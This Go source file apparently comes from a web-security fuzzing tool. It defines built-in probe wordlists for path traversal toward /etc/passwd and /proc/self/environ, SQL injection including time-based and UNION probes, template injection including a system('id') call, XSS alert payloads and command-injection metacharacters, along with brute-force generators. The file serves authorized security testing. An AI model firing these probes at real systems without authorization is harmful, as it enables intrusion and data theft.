package fuzzer

// Built-in fuzzer wordlists. Go slice literals rather than embedded files,
// following the repo's split: go:embed carries third-party or built artifacts,
// while our own data is a slice literal (as internal/shell's dictionary and
// internal/apispec's discovery lists are). These stay curated and compact —
// large dictionaries (directory busting, credential lists) belong in an upload,
// not baked into the binary.

// BuiltinList is a named, categorized payload list. Values is omitted from the
// catalog wire shape; the catalog carries a count instead.
type BuiltinList struct {
	ID          string   `json:"id"`
	Label       string   `json:"label"`
	Description string   `json:"description"`
	Category    string   `json:"category"`
	Values      []string `json:"-"`
}

// BuiltinLists returns the registry of built-in payload lists.
func BuiltinLists() []BuiltinList {
	return []BuiltinList{
		{ID: "lfi", Label: "LFI / Path Traversal", Category: "injection",
			Description: "Local file inclusion and directory traversal probes", Values: lfiProbes},
		{ID: "sqli", Label: "SQL Injection", Category: "injection",
			Description: "Common SQL injection probe strings", Values: sqliProbes},
		{ID: "ssti", Label: "Template Injection", Category: "injection",
			Description: "Server-side template injection probes (expect 49 on reflection)", Values: sstiProbes},
		{ID: "xss", Label: "XSS Reflection", Category: "injection",
			Description: "Cross-site scripting reflection probes", Values: xssProbes},
		{ID: "metachars", Label: "Special Characters", Category: "fuzzing",
			Description: "Metacharacters that elicit errors or parsing differences", Values: metacharProbes},
	}
}

// LookupBuiltin returns a built-in list's values by id.
func LookupBuiltin(id string) ([]string, bool) {
	for _, l := range BuiltinLists() {
		if l.ID == id {
			return l.Values, true
		}
	}
	return nil, false
}

// GeneratorInfo describes a generator for the catalog. Its parameter forms are
// bespoke UI, so only identity and help text travel.
type GeneratorInfo struct {
	ID          string `json:"id"`
	Label       string `json:"label"`
	Description string `json:"description"`
}

// Generators returns the catalog of parametric generators.
func Generators() []GeneratorInfo {
	return []GeneratorInfo{
		{ID: string(SourceNumbers), Label: "Numbers", Description: "Numeric range (min/max/step) or every value of a digit width (e.g. 4-digit PINs)"},
		{ID: string(SourceChars), Label: "Characters", Description: "Every combination of a charset over a length range (brute force)"},
		{ID: string(SourceLengths), Label: "Length ramp", Description: "A character repeated at increasing lengths (buffer/boundary tests)"},
		{ID: string(SourceDates), Label: "Dates", Description: "A date range with a configurable format and step"},
	}
}

var lfiProbes = []string{
	"../etc/passwd",
	"../../etc/passwd",
	"../../../etc/passwd",
	"../../../../etc/passwd",
	"../../../../../etc/passwd",
	"../../../../../../etc/passwd",
	"../../../../../../../../etc/passwd",
	"/etc/passwd",
	"....//....//....//etc/passwd",
	"..%2f..%2f..%2fetc%2fpasswd",
	"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
	"..%252f..%252f..%252fetc%252fpasswd",
	"../../../etc/passwd%00",
	"/proc/self/environ",
	"/proc/self/cmdline",
	"php://filter/convert.base64-encode/resource=index.php",
	"file:///etc/passwd",
	"..\\..\\..\\windows\\win.ini",
	"..\\..\\..\\..\\windows\\win.ini",
	"C:\\windows\\win.ini",
	"..%5c..%5c..%5cwindows%5cwin.ini",
	"....\\\\....\\\\....\\\\windows\\win.ini",
}

var sqliProbes = []string{
	"'",
	"\"",
	"`",
	"')",
	"\")",
	"';",
	"' OR '1'='1",
	"' OR '1'='1' -- ",
	"' OR '1'='1' #",
	"\" OR \"\"=\"",
	"' OR 1=1-- ",
	"') OR ('1'='1",
	"admin' -- ",
	"admin' #",
	"' UNION SELECT NULL-- ",
	"' UNION SELECT NULL,NULL-- ",
	"1' AND SLEEP(5)-- ",
	"' OR SLEEP(5)-- ",
	"1 AND 1=1",
	"1 AND 1=2",
	"1; WAITFOR DELAY '0:0:5'-- ",
	"') OR SLEEP(5)-- ",
	"1'||'1",
	"' AND extractvalue(1,concat(0x7e,version()))-- ",
}

var sstiProbes = []string{
	"{{7*7}}",
	"${7*7}",
	"#{7*7}",
	"<%= 7*7 %>",
	"${{7*7}}",
	"#{ 7*7 }",
	"{{7*'7'}}",
	"{{ '7'*7 }}",
	"*{7*7}",
	"@(7*7)",
	"{7*7}",
	"${{<%[%'\"}}%\\.",
	"{{config}}",
	"{{self}}",
	"<%= system('id') %>",
}

var xssProbes = []string{
	"<script>alert(1)</script>",
	"\"><script>alert(1)</script>",
	"'><script>alert(1)</script>",
	"\"><svg onload=alert(1)>",
	"'><svg onload=alert(1)>",
	"<svg/onload=alert(1)>",
	"<img src=x onerror=alert(1)>",
	"\"><img src=x onerror=alert(1)>",
	"javascript:alert(1)",
	"\" onmouseover=alert(1) x=\"",
	"' onmouseover='alert(1)",
	"<body onload=alert(1)>",
	"<iframe src=javascript:alert(1)>",
	"</script><script>alert(1)</script>",
	"<details open ontoggle=alert(1)>",
}

var metacharProbes = []string{
	"'", "\"", "`", "\\", "<", ">", ";", "|", "&", "$", "%", "#", "@",
	"(", ")", "[", "]", "{", "}", "*", "?", "~", "!", "^", "+", "=",
	"$()", "${}", "`id`", "$(id)", "|id", ";id", "&&id", "||id",
	"%00", "%0a", "%0d", "%0d%0a", "{{", "}}", "\\n", "\\r\\n", "\x00",
	"../", "..\\", "' OR '1'='1", "<script>",
}
